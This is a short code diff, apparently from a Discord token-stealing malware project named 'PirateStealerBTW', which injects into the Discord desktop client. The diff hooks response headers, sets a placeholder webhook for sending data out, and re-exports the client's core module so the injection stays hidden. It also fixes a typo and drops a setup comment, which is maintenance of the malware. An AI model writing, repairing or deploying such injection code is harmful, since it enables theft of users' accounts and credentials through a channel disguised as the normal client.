@@ -15,9 +15,9 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
 
 
 
-//try to put ur webhook
+
   var webhook = "%WEBHOOK_LINK%";
-  webhook = webhooK.replace("discordapp", "discord")
+  webhook = webhook.replace("discordapp", "discord")
   function FirstTime(){
       
       if (!fs.existsSync(path.join(__dirname, "PirateStealerBTW"))){
@@ -399,4 +399,3 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
   
   
   module.exports = require('./core.asar');
- 
